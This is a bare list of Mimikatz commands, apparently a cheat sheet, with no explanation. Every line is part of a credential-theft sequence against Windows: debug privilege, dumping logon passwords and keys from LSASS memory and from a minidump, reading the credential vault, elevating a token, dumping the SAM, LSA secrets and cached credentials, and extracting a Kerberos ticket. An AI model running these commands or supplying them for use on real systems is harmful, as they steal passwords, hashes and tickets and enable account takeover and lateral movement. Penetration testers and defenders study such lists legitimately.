```
.\mimikatz.exe  
privilege::debug  
sekurlsa::logonPasswords full  
vault::cred  
vault::list  
token::elevate  
vault::cred  
vault::list  
lsadump::sam  
lsadump::secrets  
lsadump::cache  
sekurlsa::dpapi  
sekurlsa::ekeys  
sekurlsa::minidump lsass.dmp  
kerberos::tgt
```